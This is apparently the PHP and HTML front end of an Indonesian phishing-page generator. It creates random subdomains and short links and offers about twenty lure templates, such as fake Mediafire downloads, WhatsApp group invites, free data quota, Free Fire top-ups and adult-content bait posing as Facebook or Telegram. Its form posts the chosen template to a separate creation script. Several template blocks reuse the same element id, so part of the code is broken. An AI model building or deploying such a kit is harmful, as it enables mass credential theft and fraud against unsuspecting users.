<?php
include 'AlexShortLink.php';
function generateRandomSubdomain($length = 8) {
    $characters = 'abcdefghijklmnopqrstuvwxyz0123456789-';
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, strlen($characters) - 1)];
    }
    return $randomString;
}

$subdomain = generateRandomSubdomain();
$domain = $_SERVER['SERVER_NAME'];
$longURL = $domain . '/' . $subdomain;
$shortenedURL = shortenURL($longURL);
?>

<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0"/>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
  <title>Buat Web P - Otomatisイチジク</title>
  <style>
    @font-face {
      font-family: 'ibm';
      src: url('https://saweria.co/ibm-plex-mono-latin-400.woff');
    }
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      font-family: 'ibm';
    }
    body {
      width: 100%;
      height: 100%;
      display: flex;
      align-items: center;
      justify-content: center;
      flex-direction: column;
      padding: 10px;
      background: #E2E8F0;
    }
    .gateway {
      position: relative;
      max-width: 600px;
      height: 90vh;
      display: flex;
      align-items: center;
      justify-content: center;
      flex-direction: column;
      padding: 10px;
    }
    .gateway span {
      margin-bottom: 20px;
    }
    .gateway .form {
      position: relative;
      width: 100%;
      display: flex;
      justify-content: center;
      flex-wrap: wrap;
      gap: 10px;
      padding: 0 20px;
    }
    .gateway .response {
      position: relative;
      width: 100%;
      display: none;
      justify-content: center;
      align-items: center;
      flex-direction: column;
      padding: 0 20px;
      margin-top: 30px;
      gap: 10px;
    }
    .response textarea {
      width: 100%;
      padding-left: 5px;
      background: #A0AEC0;
      box-shadow: 0.4rem 0.4rem 0 #222;
      border: 1px solid #000;
    }
    .form label {
      position: relative;
      width: 100%;
      display: flex;
      flex-direction: column;
    }
    label select, label input {
      width: 100%;
      border: 1px solid #000;
      border-radius: 5px;
      height: 30px;
      padding-left: 5px;
      background: #A0AEC0;
      box-shadow: 0.4rem 0.4rem 0 #222;
    }
    *:focus {
      outline: none;
    }
    .form button {
      padding: 5px 10px;
      margin-top: 10px;
      background: #faae2b;
      box-shadow: 0.4rem 0.4rem 0 #222;
      border: 1px solid #000;
      border-radius: 3px;
    }
    .gateway .source {
      position: fixed;
      top: 5px;
      right: 10px;
      padding: 5px 10px;
      margin-top: 10px;
      background: #25D366;
      box-shadow: 0.4rem 0.4rem 0 #222;
      border: 1px solid #000;
      border-radius: 3px;
    }
    footer {
      width: 100%;
      display: flex;
      align-items: center;
      justify-content: center;
    }
    .scode {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      background: #fff;
      height: 100%;
      z-index: 9999;
      display: none;
      align-items: center;
      justify-content: center;
      flex-direction: column;
      padding: 10px;
    }
    .scode textarea {
      margin-top: 20px;
      width: 100%;
      height: 100%;
      padding-left: 5px;
      border-radius: 5px;
      background: #A0AEC0;
      box-shadow: 0.4rem 0.4rem 0 #222;
      border: 1px solid #000;
    }
    .scode i {
      position: fixed;
      top: 5px;
      right: 10px;
      padding: 5px 10px;
      margin-top: 10px;
      background: pink;
      box-shadow: 0.4rem 0.4rem 0 #222;
      border: 1px solid #000;
      border-radius: 3px;
    }
    #copyButton {
        position: absolute;
        top: 10px;
        right: 10px;
        padding: 5px 10px;
        background-color: #faae2b;
        border: 1px solid #000;
        border-radius: 3px;
        cursor: pointer;
    }
            /* Gaya tambahan untuk elemen yang akan ditampilkan/sembunyikan */
        .hidden {
            display: none;
        }
  </style>
  <script>
        // Fungsi untuk menampilkan elemen berdasarkan pilihan
        function showElement(elementId) {
            // Semua elemen dengan class "hidden" disembunyikan
            var hiddenElements = document.querySelectorAll('.hidden');
            hiddenElements.forEach(function (elem) {
                elem.style.display = 'none';
            });

            // Tampilkan elemen berdasarkan pilihan
            var selectedElement = document.getElementById(elementId);
            selectedElement.style.display = 'block';
        }
    </script>
</head>
<body>
<div class="gateway">
  <div onclick="toggleSource()" class="source">Download Script</div>
 <img src="" alt="" style="width: 400px;">
  <div class="form">
    <label for="list"> TAMPILAN
          <select id="list" onchange="showElement(this.value)">
        <option selected disabled>Pilih terlebih dahulu...</option>
          <option value="tamp1">𝗠𝗲𝗱𝗶𝗮𝗳𝗶𝗿𝗲 𝗠𝗣𝟰</option>
                <option value="tamp2">𝗠𝗲𝗱𝗶𝗮𝗳𝗶𝗿𝗲 𝗭𝗜𝗣</option>
                <option value="tamp3">𝗚𝗿𝘂𝗽 𝗪𝗔 𝗩𝟭</option>
                <option value="tamp4">𝗚𝗿𝘂𝗽 𝗪𝗔 𝗩𝟮</option>
                <option value="tamp5">𝗚𝗿𝘂𝗽 𝗪𝗔 𝗩𝟯</option>
                <option value="tamp6">𝗩𝗶𝗱𝗲𝗼 𝗣𝗼𝗿𝗻𝗼 𝟭𝟴+</option>
                <option value="tamp7">𝗦𝗶𝗺𝗼𝗻𝘁𝗼𝗸 𝗡𝗼 𝗕𝘂𝗴</option>
                <option value="tamp8">𝗩𝗶𝗱𝗲𝗼 𝗕𝗸𝗽</option>
                <option value="tamp9">𝗖𝗼𝗱𝗮𝗦𝗵𝗼𝗽 𝗙𝗙 </option>
                <option value="tamp10">𝗦𝗳𝗶𝗹𝗲𝗠𝗼𝗯𝗶 </option>
                <option value="tamp11">𝗚𝗼𝗼𝗴𝗹𝗲 𝗗𝗿𝗶𝘃𝗲 </option>
                <option value="tamp12">𝗞𝘂𝗼𝘁𝗮 𝗚𝗿𝗮𝘁𝗶𝘀 𝗩𝟭</option>
                <option value="tamp13">𝗞𝘂𝗼𝘁𝗮 𝗚𝗿𝗮𝘁𝗶𝘀 𝗩𝟮</option>
                <option value="tamp14">𝗟𝗼𝗮𝗱𝗶𝗻𝗴 𝗩𝗶𝗱𝗲𝗼 𝟭𝟴+</option>
                <option value="tamp15">𝗦𝗳𝗶𝗹𝗲𝗸𝘂 𝗗𝗼𝘄𝗻𝗹𝗼𝗮𝗱 𝟭𝟴+</option>
                <option value="tamp16">𝗧𝘂𝗿𝗻𝗮𝗺𝗲𝗻 𝗙𝗙</option>
                <option value="tamp17">𝗔𝗽𝗸 𝗕𝗼𝗸𝗲𝗽 𝟭𝟴+</option>
                <option value="tamp18">𝗙𝗮𝗰𝗲𝗯𝗼𝗼𝗸 𝟭𝟴+</option>
                <option value="tamp19">𝗚𝗿𝘂𝗽 𝗧𝗲𝗹𝗲𝗴𝗿𝗮𝗺 𝟭𝟴+</option>
                <option value="tamp20">𝗗𝗼𝗼𝗱𝗦𝘁𝗿𝗲𝗮𝗺 𝟭𝟴+</option>                
      </select>
    </label>
    <label> FOLDER
      <input name="subdo" type="text" class="playerid form-input" value="<?= $subdomain ?>" readonly>
      <input name="short" type="hidden" class="playerid form-input" value="<?= $shortenedURL ?>" readonly>
    </label>
  
                <div class="hidden" id="tamp1">
                <form method="post" action="createweb.php">
                <input type="hidden" id="nomor" name="nomor" value="1" readonly>
                <input type="hidden" id="subdo" name="subdo" value="<?= $subdomain ?>" readonly>
                    <button type="submit" name="prosesbuat">submit</button>
                </form>
                </div>
    
                <div class="hidden" id="tamp2">
                <form method="post" action="createweb.php">
                <input type="hidden" id="nomor" name="nomor" value="2" readonly>
                <input type="hidden" id="subdo" name="subdo" value="<?= $subdomain ?>" readonly>
                    <button type="submit" name="prosesbuat">submit</button>
                </form>
                </div>
             
                <div class="hidden" id="tamp3">
                <form method="post" action="createweb.php">
                <input type="hidden" id="nomor" name="nomor" value="3" readonly>
                <input type="hidden" id="subdo" name="subdo" value="<?= $subdomain ?>" readonly>
                    <button type="submit" name="prosesbuat">submit</button>
                </form>
                </div>

                <div class="hidden" id="tamp4">
                <form method="post" action="createweb.php">
                <input type="hidden" id="nomor" name="nomor" value="4" readonly>
                <input type="hidden" id="subdo" name="subdo" value="<?= $subdomain ?>" readonly>
                    <button type="submit" name="prosesbuat">submit</button>
                </form>
                </div>

                <div class="hidden" id="tamp5">
                <form method="post" action="createweb.php">
                <input type="hidden" id="nomor" name="nomor" value="5" readonly>
                <input type="hidden" id="subdo" name="subdo" value="<?= $subdomain ?>" readonly>
                    <button type="submit" name="prosesbuat">submit</button>
                </form>
                </div>

                <div class="hidden" id="tamp6">
                <form method="post" action="createweb.php">
                <input type="hidden" id="nomor" name="nomor" value="6" readonly>
                <input type="hidden" id="subdo" name="subdo" value="<?= $subdomain ?>" readonly>
                    <button type="submit" name="prosesbuat">submit</button>
                </form>
                </div>

                <div class="hidden" id="tamp7">
                <form method="post" action="createweb.php">
                <input type="hidden" id="nomor" name="nomor" value="7" readonly>
                <input type="hidden" id="subdo" name="subdo" value="<?= $subdomain ?>" readonly>
                    <button type="submit" name="prosesbuat">submit</button>
                </form>
                </div>

                <div class="hidden" id="tamp8">
                <form method="post" action="createweb.php">
                <input type="hidden" id="nomor" name="nomor" value="8" readonly>
                <input type="hidden" id="subdo" name="subdo" value="<?= $subdomain ?>" readonly>
                    <button type="submit" name="prosesbuat">submit</button>
                </form>
                </div>

                <div class="hidden" id="tamp9">
                <form method="post" action="createweb.php">
                <input type="hidden" id="nomor" name="nomor" value="9" readonly>
                <input type="hidden" id="subdo" name="subdo" value="<?= $subdomain ?>" readonly>
                    <button type="submit" name="prosesbuat">submit</button>
                </form>
                </div>

                <div class="hidden" id="tamp10">
                <form method="post" action="createweb.php">
                <input type="hidden" id="nomor" name="nomor" value="10" readonly>
                <input type="hidden" id="subdo" name="subdo" value="<?= $subdomain ?>" readonly>
                    <button type="submit" name="prosesbuat">submit</button>
                </form>
                </div>

                <div class="hidden" id="tamp11">
                <form method="post" action="createweb.php">
                <input type="hidden" id="nomor" name="nomor" value="11" readonly>
                <input type="hidden" id="subdo" name="subdo" value="<?= $subdomain ?>" readonly>
                    <button type="submit" name="prosesbuat">submit</button>
                </form>
                </div>

                <div class="hidden" id="tamp12">
                <form method="post" action="createweb.php">
                <input type="hidden" id="nomor" name="nomor" value="12" readonly>
                <input type="hidden" id="subdo" name="subdo" value="<?= $subdomain ?>" readonly>
                    <button type="submit" name="prosesbuat">submit</button>
                </form>
                </div>
                
                <div class="hidden" id="tamp12">
                <form method="post" action="createweb.php">
                <input type="hidden" id="nomor" name="nomor" value="13" readonly>
                <input type="hidden" id="subdo" name="subdo" value="<?= $subdomain ?>" readonly>
                    <button type="submit" name="prosesbuat">submit</button>
                </form>
                </div>
                
                <div class="hidden" id="tamp12">
                <form method="post" action="createweb.php">
                <input type="hidden" id="nomor" name="nomor" value="14" readonly>
                <input type="hidden" id="subdo" name="subdo" value="<?= $subdomain ?>" readonly>
                    <button type="submit" name="prosesbuat">submit</button>
                </form>
                </div>
                
                <div class="hidden" id="tamp12">
                <form method="post" action="createweb.php">
                <input type="hidden" id="nomor" name="nomor" value="15" readonly>
                <input type="hidden" id="subdo" name="subdo" value="<?= $subdomain ?>" readonly>
                    <button type="submit" name="prosesbuat">submit</button>
                </form>
                </div>
                
                <div class="hidden" id="tamp12">
                <form method="post" action="createweb.php">
                <input type="hidden" id="nomor" name="nomor" value="16" readonly>
                <input type="hidden" id="subdo" name="subdo" value="<?= $subdomain ?>" readonly>
                    <button type="submit" name="prosesbuat">submit</button>
                </form>
                </div>
                
                <div class="hidden" id="tamp12">
                <form method="post" action="createweb.php">
                <input type="hidden" id="nomor" name="nomor" value="17" readonly>
                <input type="hidden" id="subdo" name="subdo" value="<?= $subdomain ?>" readonly>
                    <button type="submit" name="prosesbuat">submit</button>
                </form>
                </div>
                
                <div class="hidden" id="tamp12">
                <form method="post" action="createweb.php">
                <input type="hidden" id="nomor" name="nomor" value="18" readonly>
                <input type="hidden" id="subdo" name="subdo" value="<?= $subdomain ?>" readonly>
                    <button type="submit" name="prosesbuat">submit</button>
                </form>
                </div>
                
                <div class="hidden" id="tamp12">
                <form method="post" action="createweb.php">
                <input type="hidden" id="nomor" name="nomor" value="19" readonly>
                <input type="hidden" id="subdo" name="subdo" value="<?= $subdomain ?>" readonly>
                    <button type="submit" name="prosesbuat">submit</button>
                </form>
                </div>
                
                <div class="hidden" id="tamp12">
                <form method="post" action="createweb.php">
                <input type="hidden" id="nomor" name="nomor" value="20" readonly>
                <input type="hidden" id="subdo" name="subdo" value="<?= $subdomain ?>" readonly>
                    <button type="submit" name="prosesbuat">submit</button>
                </form>
                </div>
  </div>
  </div>
  <footer>
  Created By <a href="https://wa.me/" style="text-decoration: none;margin: 0 10px"> Bintang Zuckerberg </a> With <img width="20" height="20" src="" style="margin-left: 10px">
</footer>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
<script>
function toggleSource() {
      window.location = 'https://';
      }
</script>
</body>
</html>